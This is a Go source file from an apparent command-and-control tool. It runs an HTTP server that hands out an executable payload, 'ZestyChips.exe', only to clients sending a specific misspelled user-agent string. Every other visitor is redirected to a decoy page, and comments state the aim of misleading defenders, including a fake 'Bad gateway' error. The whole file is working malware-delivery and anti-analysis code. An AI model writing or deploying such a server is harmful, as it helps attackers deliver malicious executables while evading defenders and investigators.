package c2

import (
	"log"
	"net/http"
	"os"
	"time"
)

func ListenForHTTP() {
	// serve payload
	// choosing index.php as an example, but you can make this endpoint whatever you like
	http.HandleFunc("/index.php", func(w http.ResponseWriter, r *http.Request) {

		filename := "ZestyChips.exe"                                                             // file to serve
		ua := "Mozilla/5.0 (Windows NT 10.0; Wln64; x64; rv:121.0) Gecko/20100101 Firefox/121.0" // spot the typo?

		// redirect defenders trying to poke about!
		if r.UserAgent() != ua {
			http.Redirect(w, r, "/indox.php", http.StatusFound)
			return
		}

		// user agent is checked, prepare the download
		file, err := os.Open(filename)
		if err != nil {
			http.Error(w, "Bad gateway.", http.StatusBadRequest) // throw defenders off the scent
			log.Printf("Payload not found, %v", err)
			return
		}
		defer file.Close()

		// set headers needed for file download
		w.Header().Set("Content-Disposition", "attachment; filename="+filename)
		w.Header().Set("Content-Type", "application/octet-stream")

		// serve
		http.ServeFile(w, r, filename)
	})

	http.HandleFunc("/indox.php", func(w http.ResponseWriter, r *http.Request) {
		// Serve decoy page
		html := "html/indox.html"

		file, err := os.Open(html)
		if err != nil {
			http.Error(w, "File not found", http.StatusNotFound)
			return
		}

		defer file.Close()

		// headers
		w.Header().Set("Content-Type", "text/html")

		// serve
		http.ServeContent(w, r, html, time.Now(), file)
	})

	log.Println("HTTP Server listening on :80")
	if err := http.ListenAndServe(":80", nil); err != nil {
		log.Fatalf("Could not start server %v", err)
	}
}
